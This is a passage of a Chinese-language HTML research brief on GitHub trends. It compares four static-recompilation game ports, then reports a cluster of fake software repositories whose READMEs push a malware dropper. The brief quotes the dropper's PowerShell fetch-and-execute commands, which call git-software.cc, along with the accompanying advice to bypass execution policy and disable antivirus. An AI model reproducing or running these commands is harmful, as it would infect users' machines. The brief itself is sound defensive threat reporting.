@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>2026-10-30 GitHub 趋势研究简报 | GitHub 趋势研究</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><text y='20' font-size='20'>📅</text></svg>">
+    <link rel="stylesheet" href="/assets/style.css">
+</head>
+<body>
+    <nav class="nav">
+        <div class="nav-inner">
+            <a href="/index.html" class="nav-brand">
+                <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.477 2 2 6.477 2 12c0 4.418 2.865 8.166 6.839 9.489.5.09.682-.217.682-.482 0-.237-.008-.866-.013-1.7-2.782.603-3.369-1.342-3.369-1.342-.454-1.155-1.11-1.462-1.11-1.462-.908-.62.069-.608.069-.608 1.003.07 1.531 1.03 1.531 1.03.892 1.529 2.341 1.087 2.91.832.092-.647.35-1.088.636-1.338-2.22-.253-4.555-1.11-4.555-4.943 0-1.091.39-1.984 1.029-2.683-.103-.253-.446-1.27.098-2.647 0 0 .84-.269 2.75 1.025A9.578 9.578 0 0112 6.836c.85.004 1.705.115 2.504.337 1.909-1.294 2.747-1.025 2.747-1.025.546 1.377.202 2.394.1 2.647.64.699 1.028 1.592 1.028 2.683 0 3.842-2.339 4.687-4.566 4.935.359.309.678.919.678 1.852 0 1.336-.012 2.415-.012 2.743 0 .267.18.578.688.48C19.138 20.163 22 16.418 22 12c0-5.523-4.477-10-10-10z"/></svg>
+                GitHub 趋势研究
+            </a>
+            <div class="nav-links">
+                <a href="/index.html" id="nav-home"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m3 9 9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg><span>首页</span></a>
+                <a href="/daily.html" id="nav-daily" class="active"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect width="18" height="18" x="3" y="4" rx="2" ry="2"/><line x1="16" x2="16" y1="2" y2="6"/><line x1="8" x2="8" y1="2" y2="6"/><line x1="3" x2="21" y1="10" y2="10"/></svg><span>日报</span></a>
+                <a href="/projects.html" id="nav-projects"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg><span>项目</span></a>
+                <a href="/trends.html" id="nav-trends"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg><span>趋势</span></a>
+            </div>
+        </div>
+    </nav>
+<main class="container">
+    <a href="/daily.html" class="back-link">← 返回日报索引</a>
+    <div class="content-card">
+        <h1 id="2026-10-30-github">2026-10-30 GitHub 趋势研究简报</h1>
+<blockquote>
+<p><strong>证据边界：</strong> 本日全部元数据取自 <strong>2026-10-29T22:02Z–22:30Z 之间的多次 GitHub REST / Search API 调用</strong>（gh CLI 认证），字段包括 <code>stargazers_count</code> / <code>forks_count</code> / <code>subscribers_count</code> / <code>open_issues_count</code> / <code>size</code> / <code>language</code> / <code>license.spdx_id</code> / <code>topics</code> / <code>created_at</code> / <code>pushed_at</code> / <code>owner.type</code> / <code>description</code> / <code>homepage</code> / <code>archived</code>；另用 <code>git/trees/HEAD</code>（根树）与 <code>?recursive=1</code>（<strong>检查返回的 <code>truncated</code> 字段</strong>）、<code>commits</code>（<strong>用 Link 头 <code>rel="last"</code> 取精确总数</strong>）、<code>contributors</code>、<code>releases</code>、<code>issues</code>、<code>contents/{path}</code>（<strong>取 <code>.sha</code> 与 <code>Accept: application/vnd.github.raw</code> 原文</strong>）、<code>users/{owner}</code>。
+<strong>⭐⭐⭐ 关于「增速」表述：</strong> <code>stargazers</code> 端点对本 token 持续返回 <strong>404</strong>，因此<strong>星标时间分布无法核验</strong>，所有「涨了多少」都是<strong>两次快照之间的总量差</strong>，不是当日新增，也<strong>不能读作「用户数」</strong>。本日报在明确标注快照时刻的地方给出差值，未标注处只给当前值。
+<strong>⭐⭐⭐ 关于本日对投放载荷的处理纪律：</strong> 本日报<strong>下载了</strong> <code>https://git-software.cc/ps/Setup.ps1</code>（8,899 字节）并<strong>仅做静态文本分析</strong>，<strong>从未执行、未解密其载荷</strong>。本日报<strong>不复制其载荷内容</strong>，只记录其<strong>结构性特征</strong>（PSObfuscator 风格的封装：Base64 → 长度与对齐自检 → HMAC-SHA256 完整性校验 → AES-256-CBC 解密 → gzip/deflate 解压 → <code>Parser::ParseInput</code> 语法校验 → <code>GetScriptBlock()</code>）。<strong>本日报无法判断该脚本最终会执行什么，本日报也不做这个判断。</strong>
+<strong>⭐⭐ 关于「同构簇」的判定方法：</strong> 本日报今日<strong>不再只依赖文件数/体积/owner 名/创建时间窗</strong>这类间接统计，而是<strong>逐个取 <code>contents/README.md</code> 原文并检索投放指令字符串</strong>，并对样本中的簇取 <code>contents/README.md</code> 的 <strong><code>.sha</code>（git blob 哈希，内容寻址）</strong> 做比对。<strong>⭐ 而本日必须说清一个方法论修正：blob SHA 相同是「同一份内容被复制」的强证据，但本次簇内 README 的 SHA 各不相同（因为只替换了软件名），所以「blob SHA 相同」这条判据本日不适用 —— 真正适用的是「同一条投放 URL 在 N 个不同 blob 中出现」。</strong>
+<strong>⭐ 关于「独立路径」的判定：</strong> 本日报对四个静态重编译项目逐一检索了对方项目名（<code>ultratears</code> / <code>totk-pc-recomp</code>）与共同上游名（<code>LASRecomp</code> / <code>MacNativeGames</code> / <code>SavageWindRecomp</code>），核验结果是：<strong><code>ultratears</code> 的 README 未提及 <code>totk-pc-recomp</code>，<code>totk-pc-recomp</code> 的 README 提及 <code>LASRecomp</code> / <code>MacNativeGames</code> / <code>d2r-mobile</code> / <code>nxnative</code> / <code>SavageWindRecomp</code> / <code>Ryujinx</code> / <code>deko3d</code> / <code>hactool</code> 但未提及 <code>ultratears</code>。</strong> 即<strong>两个打同一款游戏的项目互不知晓</strong>；但<strong>它们都建立在同一批上游项目之上</strong>——这是「共享上游 ≠ 共享代码」的区分，本日报明确记录。</p>
+</blockquote>
+<h2 id="_1">今日重点趋势（按排名）</h2>
+<h3 id="1-94">趋势 1：静态重编译在同一天出现四个互不相识的实现，其中两个打同一款游戏却走完全不同的技术路线（趋势分 94）</h3>
+<p><strong>⭐⭐⭐ 本日最重要的观察不是「哪个移植更强」，而是：同一天之内，四个互不相识的团队，各自把「把主机游戏代码变成原生 PC 程序」这件事推进到了可运行状态，而其中两个在做同一款游戏——却既没有使用彼此的代码，也没有承认对方存在。</strong></p>
+<p><strong>⭐⭐⭐⭐ 这为什么重要？因为它是本日报见过最干净的一次「技术难度被独立确认」样本。</strong> 本日报此前记录过多次「两个互不相识的项目撞上同一个核心难度」（10-23 的 UniXNU 与 Macintosh 撞上 16 KiB→4 KiB 页表翻译与 Apple 私有输入处理；10-25 的 KohakUnlock 用一次真机失败换来了「分区号是易变量、GUID 是稳定标识」这条纪律）。<strong>而今日这一例的分量更重，理由是它有三条独立的旁证同时成立：</strong></p>
+<ol>
+<li><strong>四个项目互不知情</strong>（本日报逐一检索了对方项目名，结果见上方证据边界）；</li>
+<li><strong>其中两个做同一款游戏却走完全不同的图形与 CPU 路线</strong>（见下表）；</li>
+<li><strong>四个项目的 issue 区都在收「真实用户按文档操作后失败」的报告</strong>，说明它们都进入了真实使用阶段，而不是停在 demo。</li>
+</ol>
+<table>
+<thead>
+<tr>
+<th>项目</th>
+<th>游戏</th>
+<th>CPU 路线</th>
+<th>图形后端</th>
+<th style="text-align: right;">commits</th>
+<th style="text-align: right;">subs</th>
+<th style="text-align: right;">oi</th>
+<th style="text-align: right;">releases</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>valentderah/totk-pc-recomp</code></td>
+<td>TotK 1.2.1 / 1.4.3</td>
+<td>ARM64 → C → x86-64（<strong>自扩展 lifter</strong>）</td>
+<td><strong>自写 NVN 前端 + Vulkan 后端</strong></td>
+<td style="text-align: right;">261</td>
+<td style="text-align: right;">12</td>
+<td style="text-align: right;">32</td>
+<td style="text-align: right;">1</td>
+</tr>
+<tr>
+<td><code>kuraeow/ultratears</code></td>
+<td>TotK 1.4.3</td>
+<td>ARM64 → C → x86-64</td>
+<td><strong>自写 NVN 实现 + Vulkan</strong></td>
+<td style="text-align: right;"><strong>3</strong></td>
+<td style="text-align: right;">12</td>
+<td style="text-align: right;">29</td>
+<td style="text-align: right;">1</td>
+</tr>
+<tr>
+<td><code>NotRexed/SkyboundTotk</code></td>
+<td>TotK <strong>1.0.0 基线</strong></td>
+<td>ARM64 → C → x86-64</td>
+<td><strong>WebGPU（wgpu-native）</strong></td>
+<td style="text-align: right;">6</td>
+<td style="text-align: right;">11</td>
+<td style="text-align: right;">11</td>
+<td style="text-align: right;">0</td>
+</tr>
+<tr>
+<td><code>Shagg88/COGBox</code></td>
+<td>Gears of War 2 / 3 / Judgment（Xbox 360）</td>
+<td>Xbox 360 → C++</td>
+<td><strong>Direct3D 12</strong>（Vulkan 实验性）</td>
+<td style="text-align: right;">53</td>
+<td style="text-align: right;">7</td>
+<td style="text-align: right;">15</td>
+<td style="text-align: right;">5</td>
+</tr>
+</tbody>
+</table>
+<p><strong>⭐⭐⭐⭐ 而 <code>totk-pc-recomp</code> 的架构文档是本日最值得单独读的一份 —— 因为它是本日报见过最诚实的「我用了谁、没用什么、为什么」三段式拆解：</strong></p>
+<p><code>docs/architecture.md</code> 原文：</p>
+<blockquote>
+<p><strong>MacNativeGames cannot run on x86-64 as it is: its CPU path executes ARM64 code natively. LAS Recomp's host only covers what <em>Link's Awakening</em> calls. The port takes the CPU half from LAS Recomp and the game half from MacNativeGames, and writes the parts neither has: a lifter that scales to TotK, and a Vulkan back end for the NVN front end.</strong></p>
+</blockquote>
+<p><strong>⭐⭐⭐⭐⭐ 「取 LAS Recomp 的 CPU 半边、取 MacNativeGames 的游戏半边、自己写两者都没有的部分」—— 这是一句把「复用」拆到零件级的工程声明，而多数项目只说「基于 X 项目」。</strong></p>
+<p><strong>⭐⭐⭐⭐⭐⭐ 而同一份文档里还有一条本日最值得抄的供应链纪律：</strong></p>
+<blockquote>
+<p><strong>jump tables resolved by our own symbolic pass instead of Unicorn, which keeps GPL code out of the shipped generator</strong></p>
+</blockquote>
+<p><strong>⭐⭐⭐⭐⭐⭐⭐ 即：它没有使用 Unicorn（GPL），而是自己写符号遍历来解析跳转表 —— 理由是「把 GPL 代码挡在交付产物之外」。</strong> <strong>本日报连续多日记录「许可元数据问题」（10-22 php2shell-poc、10-23 UniXNU/Snapintosh、10-25 raven 的 GPL 重许可），今日这一例是本日报第一次见到「因为许可原因而选择不依赖某个知名工具」的设计决策。</strong> <strong>⭐⭐ 这比事后补一份 <code>LICENSES.json</code> 更难，也更彻底。</strong></p>
+<p><strong>⭐⭐⭐⭐⭐⭐⭐⭐ 而它的需求声明同样把「跑不起来」的成本写在前面：</strong></p>
+<blockquote>
+<p>Requirements: Windows 10 or later, an x86-64 CPU with AVX2, a GPU with Vulkan 1.3 and <code>VK_EXT_external_memory_host</code>, about 36 GiB free during setup (20 GiB after).</p>
+</blockquote>
+<p><strong>⭐⭐⭐⭐⭐⭐⭐⭐⭐ 36 GiB 的安装期占用 + AVX2 + Vulkan 1.3 + <code>VK_EXT_external_memory_host</code> —— 这三个条件共同决定了「谁能用」。</strong> <strong>⭐⭐ 而「哪些人不能用」正是本日这批项目共同的隐含边界：<code>totk-pc-recomp</code> 的 32 条 issue 里，<code>#28 Can't finish the install process?</code> 明确停在「Somewhere during \"Translating code to C\"」、<code>#31 Vulkan out of device memory (-2) on AMD Radeon 610M</code>、<code>#34 GPU Timeouts</code> —— ⭐⭐ 即</strong>用户是「照文档做了、在第 4 步断了」的具体人<strong>，而不是点赞的人。</strong></p>
+<p><strong>⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐ 而这正是本日报今天最想说的一句：在这批静态重编译项目里，</strong>issue 区的信息密度与 star 数完全解耦<strong> —— <code>ultratears</code> 只有 3 个 commit、424⭐、30 条 issue，其中 <code>#37 Shader step: 82 of 28,769 vertex shaders fail to translate</code> 与 <code>#34 Black "shadow box" ahead of Link: shadow compares need Dref clamped to 0..1 (D16 stored as D32F)</code> 是</strong>具体到 API 语义的技术报告<strong>，而 <code>#29 error in step 4 when compile the dumped game</code> 是</strong>具体到步骤编号的失败点<strong>。</strong></p>
+<p><strong>⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐ 而本日报必须同时记录一件本日报无法解释清楚的事 —— <code>totk-pc-recomp</code> 的 <code>created_at</code> 与它的 commit 时间线互相矛盾：</strong></p>
+<table>
+<thead>
+<tr>
+<th>字段</th>
+<th>值</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>created_at</code></td>
+<td><strong>2026-10-29T12:32:46Z</strong></td>
+</tr>
+<tr>
+<td><code>pushed_at</code></td>
+<td>2026-10-29T15:05:56Z（快照时距今约 7 小时）</td>
+</tr>
+<tr>
+<td>最晚的 100 条 commit 中最早一条</td>
+<td><strong>2026-10-26T22:01:54Z</strong></td>
+</tr>
+<tr>
+<td>Link 头 <code>rel="last"</code></td>
+<td>第 <strong>261</strong> 页 → 精确 261 个 commit</td>
+</tr>
+<tr>
+<td>精确 commit 总数</td>
+<td><strong>261</strong></td>
+</tr>
+</tbody>
+</table>
+<p><strong>⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐ 即：这个仓库在 GitHub 上的创建时间（10-29T12:32）</strong>晚于它 261 个 commit 中最早的那批（10-26T22:01）<strong>，约 </strong>62.5 小时<strong>。</strong> 这只有两种可能：① 仓库是从别处（本地 git 或私有仓库）推送上来的；② <code>created_at</code> 记录的是某种「公开化」时刻而非「首次提交」时刻。<strong> ⭐⭐⭐⭐ 本日报</strong>不做判断<strong>，只把它记为一条</strong>元数据纪律<strong>：本日报此前已在 raven 身上建立过「<code>created_at</code> 不可信」（改名的旧仓库），</strong>今日这条是同一纪律的第二种形态 —— <code>created_at</code> 晚于 commit 时间线<strong>，而它出现的原因恰好相反（不是改名，是推送/公开）。</strong> ⭐⭐⭐ 「按 <code>created_at</code> 排序的今日新项目榜单」会把这个拥有 261 个 commit、三天前就在写的项目，排在今天才创建的空壳农场之后。**</p>
+<p><strong>⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐ 而 <code>ultratears</code> 恰好是这条纪律的</strong>反例中的反例<strong>：它的 <code>created_at</code> 是 2026-10-25T00:04:08Z，3 个 commit 全部落在 </strong>10-25 09:26 / 15:50 / 20:14<strong> —— </strong>时间线自洽。<strong> </strong>⭐⭐ 即同一款游戏、同一种技术路线、同一周之内，一个项目的时间线自洽（3 commits / 1 day），另一个不自洽（261 commits / 3 days）。**</p>
+<p><strong>架构师速览（四个静态重编译项目的架构对照）：</strong></p>
+<table>
+<thead>
+<tr>
+<th>决策问题</th>
+<th>研究判断</th>
+<th>证据边界</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>系统边界</td>
+<td><strong>四个项目把同一条边界划在「游戏文件与生成产物永不进仓库」</strong>：totk-pc-recomp「No game files are included … It is for your own use. Do not share it.」；ultratears「This repository contains no game code, no game assets, no Nintendo SDK code, no firmware and no keys, and it does not tell you where to get any of them … do not open issues asking for it.」；SkyboundTotk「Keep your game files, generated code, executable package and saves private. The <code>game/</code>, <code>build/</code> and <code>dist/</code> directories are Git-ignored, but check what you are publishing rather than relying on ignore rules alone」；COGBox「You need your own copy of each game. No game files are included or ever will be.」<strong>⭐⭐ 而四个项目各自还把「边界自己会漏」这件事写了出来</strong>：SkyboundTotk「The checks do not verify the entire RomFS or guarantee that a dump is complete.」、ultratears「no settings menu yet」、totk-pc-recomp 的「Planned: Linux and the Steam Deck / Mods made for emulators / VRR」</td>
+<td>四个 README 的原文段落（已逐字引用）、四个仓库根树的文件构成（totk-pc-recomp 含 <code>recomp/ runtime/ tools/ installer/ tests/ docs/ AGENTS.md CLAUDE.md THIRD_PARTY_NOTICES.md config.example.toml totk.ini.example</code>；ultratears 含 <code>src/{gfx,host,probe,runtime,vk} tools/ third_party/ BUILDING.md README.ru.md</code>；SkyboundTotk 根树未逐项核验；COGBox 含 <code>Gears2-Native/ Gears3-Native/ GearsJ-Native/</code>）。<strong>⭐ 未核验：SkyboundTotk 的完整树结构、COGBox 的 512 个文件的职责划分、四个项目的实际可玩性（均需自备游戏与 GPU）</strong></td>
+</tr>
+<tr>
+<td>主路径</td>
+<td><strong>totk-pc-recomp</strong>：自备 NSP/XCI + 主机密钥 → MacNativeGames 的 Python 解包（<code>compression.zstd</code> / Python 3.14）→ hactool（<code>1d64a83</code>）+ BKTR 补丁合并更新 → <code>expected-v*.json</code> 哈希校验 ExeFS/RomFS/fonts → <strong>LAS Recomp 的手写 lifter（<code>lifter.py</code>）与 NEON/FP 降级（<code>simd_c.py</code>/<code>simd.h</code>）输出「每个客户函数一个 C 函数」</strong> → 自己的符号遍历解析跳转表 → 编译 → Vulkan 后端跑 NVN 前端 → 装进 <code>totk.exe</code>。<strong>ultratears</strong>：自备 dump → <code>setup.bat</code> 7 步（dump 检查 / 解包 / <strong>翻译 28,769 个 shader</strong> / 编译 / 打包）→ <code>UltraTears.exe</code>。<strong>SkyboundTotk</strong>：自备已解包 1.0.0 ExeFS/RomFS → <code>build.bat</code> → 提升 AArch64 → 编译原生 exe → <code>dist/SkyboundTOTK/</code>（需 <code>image.bin</code> <code>image.json</code> <code>romfs/</code> <code>wgpu_native.dll</code> <code>SDL2.dll</code> 随行）。<strong>COGBox</strong>：launcher 识别游戏盘镜像 → 解包 → 校验版本 → 静态重编译 → 自写 D3D12 渲染器 → 运行</td>
+<td>totk-pc-recomp 的 <code>docs/architecture.md</code> 四节（Starting points / Pipeline / CPU / …）与 <code>docs/controls.md</code> 链接；ultratears 的 README「Requirements for either method」与「Choose how to build first」两表；SkyboundTotk README 的「Prepare and build」四步与目录树示例；COGBox README 的「What it is」与 launcher 描述。<strong>⭐ 未核验：四个项目的实际运行结果（需硬件与自备游戏）；ultratears 的 28,769 shader 翻译步骤是否可完成（issue #37 报告 82 个失败）</strong></td>
+</tr>
+<tr>
+<td>关键权衡</td>
+<td><strong>⭐ CPU 提升器 vs 复用现成提升器</strong>（totk-pc-recomp 改写 LAS Recomp 的 lifter 以支持 TotK 规模：「no 64 MB limit on <code>main</code>；<code>subsdk*</code> loaded」，并用<strong>自写符号遍历替换 Unicorn</strong>——<strong>代价是维护成本，收益是 GPL 不进产物</strong>）· <strong>⭐⭐ 图形后端选型</strong>（totk-pc-recomp 与 ultratears 选 <strong>Vulkan</strong>，SkyboundTotk 选 <strong>WebGPU</strong>——<strong>⭐ 这是同一款游戏、同一条 CPU 路线下最有意思的一处分岔：WebGPU 换来跨平台与更简单的着色器工具链，代价是它自认「Some graphics translation still happens at runtime」</strong>）· <strong>⭐ 主流水线 vs 运行时翻译</strong>（SkyboundTotk 明写运行时仍有部分图形翻译；ultratears 把 shader 转换放在<strong>构建时</strong>「Shaders and textures are converted for PC graphics cards when the game is built, not while you play」，但仍报首次见效果时卡顿）· <strong>⭐ 基线版本 vs 最新版本</strong>（totk-pc-recomp 覆盖 1.2.1 与 1.4.3 并让存档互通；SkyboundTotk <strong>只支持 1.0.0</strong> 且明写「other versions or updates are not supported by the game-specific hooks」——<strong>这是兼容性广度与实现深度的经典取舍</strong>）· <strong>⭐⭐ 状态表的诚实度</strong>（<strong>⭐⭐ ultratears 与 SkyboundTotk 是本日报今日唯二把「未验证」写成表格行的项目</strong>：ultratears「Other PCs and graphics cards</td>
+<td><strong>not tested yet</strong>」「Steam Deck / Linux</td>
+</tr>
+<tr>
+<td>最小 PoC</td>
+<td>1. <strong>⭐⭐ 只读四份 README 的 Status 表</strong>（不下载、不构建）——<strong>看「哪些行标着未测试」</strong>：ultratears 19 行状态里只有 1 行（Great Sky Island）标「plays」，其余全是「not tested yet / not supported yet」；SkyboundTotk 第一句就是「Expect graphical problems and incomplete compatibility」→ 2. <strong>⭐⭐ 读 <code>totk-pc-recomp</code> 的 <code>docs/architecture.md</code> 一节</strong>（<strong>这是本日最省事的一次价值获取：它在一节之内说清了「我用了谁、没用什么、为什么、缺口在哪」</strong>）→ 3. <strong>⭐⭐ 读 issue 区并区分两种 issue</strong>（「我想要这个功能」vs「我照文档做了然后第 N 步断了」）——<strong>本日报今日在 ultratears/totk-pc-recomp 上看到 10+ 条后者</strong>→ 4. <strong>⭐ 查 <code>created_at</code> 与最早 commit 的时间差</strong>（<strong>本日报今日在 totk-pc-recomp 上发现 62.5 小时的倒挂</strong>）→ 5. <strong>⭐⭐ 检索四个项目是否提及彼此</strong>（本日报今日核验结果：两个 TotK 项目互不知晓，但都建立在 LAS Recomp / MacNativeGames / SavageWindRecomp / Ryujinx 等共同上游之上）→ 6. <strong>⭐ 查 release 是否有 asset</strong>（COGBox 5 个 release、totk-pc-recomp 与 ultratears 各 1 个、SkyboundTotk <strong>0 个</strong>）→ 7. <strong>⭐⭐ 最后才看 star</strong>（<strong>424⭐ / 423⭐ / 392⭐ / 216⭐ 与「能不能跑起来」几乎无关</strong>）</td>
+<td><strong>第 1 步是本方法的核心</strong>（它零成本，且直接给出成熟度而非热度）· <strong>第 3 步是区分「许愿」与「采用」的关键</strong> · <strong>第 4 步是本日报今日新增的一条、且只在这一个项目上触发</strong> · <strong>第 5 步是本日报今日新增的、对「独立路径」判断的硬核验</strong> · <strong>第 7 步是排序而非筛选</strong> · <strong>本 PoC 不覆盖</strong>：任何项目的实际可玩性（<strong>需要自备游戏 dump、GPU、AVX2、数十 GiB 磁盘 —— 本日报明确不建议任何人为了验证它去跑一次 36 GiB 的构建</strong>）</td>
+</tr>
+</tbody>
+</table>
+<h3 id="2-93">趋势 2：本日的热度失真已从「刷星」升级为「投放可执行载荷」（趋势分 93）</h3>
+<p><strong>⭐⭐⭐⭐⭐ 本日最刺眼的不是星数，而是本日报第一次在 GitHub 趋势样本里核验到一条</strong>仍在运行的<strong>可执行投放指令，并且它出现在 88% 的取样新仓库里。</strong></p>
+<h4 id="_2">本日核验到的簇（第六类异常模式：携带投放载荷）</h4>
+<p><strong>⭐⭐⭐⭐⭐⭐ 关键判据（比此前任何一天都硬）：</strong></p>
+<table>
+<thead>
+<tr>
+<th>项</th>
+<th>核验结果</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>分母</td>
+<td><code>created:2026-10-29 + stars:&gt;=40</code> → <strong>206</strong> 个仓库</td>
+</tr>
+<tr>
+<td>其中体积 ≤ 20 KB</td>
+<td><strong>180</strong> 个（<strong>87.4%</strong>）</td>
+</tr>
+<tr>
+<td>取样</td>
+<td>按 star 降序取前 100 个，<strong>逐个</strong>抓取 <code>contents/README.md</code> 原文</td>
+</tr>
+<tr>
+<td>命中投放 URL 的仓库</td>
+<td><strong>88 / 100</strong></td>
+</tr>
+<tr>
+<td>命中方式</td>
+<td>README 中出现 <strong>2 行</strong> <code>git-software.cc</code>（一处 <code>irm … | Invoke-Expression</code>，一处 <code>Invoke-RestMethod … | Invoke-Expression</code>）</td>
+</tr>
+</tbody>
+</table>
+<p><strong>⭐⭐⭐⭐⭐⭐⭐ 逐日对比（这才是「升级」的证据）：</strong></p>
+<table>
+<thead>
+<tr>
+<th>日期</th>
+<th style="text-align: right;"><code>stars:&gt;=40</code> 新仓库</th>
+<th style="text-align: right;">体积 ≤ 20 KB</th>
+<th style="text-align: right;">占比</th>
+<th>含投放指令</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>2026-10-27</td>
+<td style="text-align: right;">74</td>
+<td style="text-align: right;">10</td>
+<td style="text-align: right;">13.5%</td>
+<td>未抽样核验</td>
+</tr>
+<tr>
+<td>2026-10-28</td>
+<td style="text-align: right;">58</td>
+<td style="text-align: right;">9</td>
+<td style="text-align: right;">15.5%</td>
+<td><strong>0</strong>（两个簇逐个核验，均不含）</td>
+</tr>
+<tr>
+<td><strong>2026-10-29</strong></td>
+<td style="text-align: right;"><strong>206</strong></td>
+<td style="text-align: right;"><strong>180</strong></td>
+<td style="text-align: right;"><strong>87.4%</strong></td>
+<td><strong>88 / 100 命中</strong></td>
+</tr>
+</tbody>
+</table>
+<p><strong>⭐⭐⭐⭐⭐⭐⭐⭐ 本日报特意把 10-28 的两个簇重查了一遍，以确认「这是新出现的、不是一直如此」：</strong></p>
+<ul>
+<li>10-28 簇 A（3 秒内 4 仓库）：<code>Pebblebretrap/Camtasia</code>、<code>Stampdrusupply/Cinema-4d</code>、<code>TyphoonMidgeRegister/KMS-Pico</code>、<code>daimyodragonpit/BorisFX</code> → <strong>投放行数均为 0</strong>；</li>
+<li>10-28 簇 B（6 仓库共享 <code>.gitignore</code> blob）：<code>russells9175/Microsoft-365-Full-Suite-2026</code>、<code>chase4812/CapCut-Pro-Studio-2026</code> → <strong>投放行数均为 0</strong>。</li>
+</ul>
+<p><strong>⭐⭐⭐⭐⭐⭐⭐⭐⭐ 即：</strong>这是本日新出现的升级，不是既有簇的延续。**</p>
+<p><strong>⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐ 而簇内 README 的形态也值得记录 —— 因为它是「同一模板 + 替换软件名」的最纯粹版本：</strong></p>
+<p>```markdown</p>
+<h1 id="standalone-desktop-installer"><Software Name> — Standalone Desktop Installer</h1>
+<p>Pre-activated local build for testing and deployment.</p>
+<blockquote>
+<p><strong>Distribution Type:</strong> Pre-activated Standalone Build
+<strong>Target Platform:</strong> Windows x64 Desktop
+<strong>Estimated File Size:</strong> 1.5 GB
+<strong>Last Verified Mirror Sync:</strong> October 2026
+...
+irm https://git-software.cc/ps/Setup.ps1 | Invoke-Expression
+...</p>
+</blockquote>
+<h3 id="antivirus-smartscreen-alerts">💬 Antivirus / SmartScreen Alerts</h3>
+<p>Security software might occasionally flag automated installers. If the script gets blocked,
+pause "Real-time protection" in your Windows Security dashboard, run the setup, and re-enable
+your antivirus immediately afterward.
+...</p>
+<h2 id="organic-discovery-identification">🔍 Organic Discovery &amp; Identification</h2>
+<ul>
+<li>download <Software Name> setup 2026</li>
+<li><Software Name> system information tool
+```</li>
+</ul>
+<p><strong>⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐ 而「Organic Discovery &amp; Identification」这一节是一个本日报值得单独点名的设计：</strong> 它是一组伪装成搜索关键词的短语（<code>download X setup 2026</code>、<code>X system information tool</code>、<code>X hardware detection</code>），<strong>其作用是让这份 README 在「站内搜索」里被当成教程命中</strong>。<strong>⭐⭐ 本日报把它记为「SEO 投毒」手法的一例 —— 仓库内容不面向读者，而是面向爬虫。</strong></p>
+<p><strong>⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐ 而最需要被记录的一点，是投放指令被放在了「排障说明」的位置：</strong></p>
+<blockquote>
+<h3 id="script-is-blocked-by-execution-policy">💬 Script is blocked by Execution Policy</h3>
+<p>If Windows stops the script from running due to security policies, you can force it to run by pasting this command into a standard Command Prompt (cmd):
+<code>cmd
+powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://git-software.cc/ps/Setup.ps1 | Invoke-Expression"</code></p>
+<h3 id="antivirus-smartscreen-alerts_1">💬 Antivirus / SmartScreen Alerts</h3>
+<p>Security software might occasionally flag automated installers. If the script gets blocked, <strong>pause "Real-time protection" in your Windows Security dashboard</strong>, run the setup, and re-enable your antivirus immediately afterward.</p>
+</blockquote>
+<p><strong>⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐ 三件事同时发生：(1) 用 <code>-ExecutionPolicy Bypass</code> 绕过 PowerShell 执行策略；(2) 指示用户</strong>关闭杀毒软件的实时防护<strong>；(3) 把这些写成「排障帮助」而不是「安装步骤」。</strong> <strong>⭐⭐⭐ 本日报明确记录：这三者叠加，把一个正常用户导向「主动削弱自己机器的安全防护，然后把远程脚本以当前用户权限执行」的位置。这是本日报在 GitHub 趋势样本里第一次核验到的、</strong>具备实际危害路径<strong>的生态级模式 —— 与此前记录的「刷星」「空壳仓库」「模板农场」不是同一类问题。</strong></p>
+<p><strong>⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐ 而本日报对该投放脚本的处理方式必须写清楚：</strong></p>
+<p>本日报<strong>下载</strong>了该脚本（8,899 字节）并<strong>仅作静态文本分析</strong>，<strong>从未执行，也从未解密其载荷</strong>。本日报记录其<strong>结构特征</strong>（不记录载荷内容）：</p>
+<table>
+<thead>
+<tr>
+<th>层</th>
+<th>观察到的机制</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>外壳</td>
+<td>PowerShell，变量名为 32 位十六进制 GUID（<code>$v5f50dbb19f3f4cf0a2a110d0ef32fc16</code> 等），典型 PSObfuscator 风格</td>
+</tr>
+<tr>
+<td>自检</td>
+<td><code>FromBase64String</code> 后检查 <code>Length -lt 128</code> 且 <code>(Length-112) % 16 -ne 0</code> → 抛 <code>Invalid PSObfuscator payload.</code></td>
+</tr>
+<tr>
+<td>完整性</td>
+<td>从载荷头部切出 32 字节 key / 32 字节 HMAC key / 16 字节 IV / 32 字节 expected tag，用 <strong>HMAC-SHA256</strong> 校验，不匹配即抛 <code>PSObfuscator payload integrity check failed.</code></td>
+</tr>
+<tr>
+<td>解密</td>
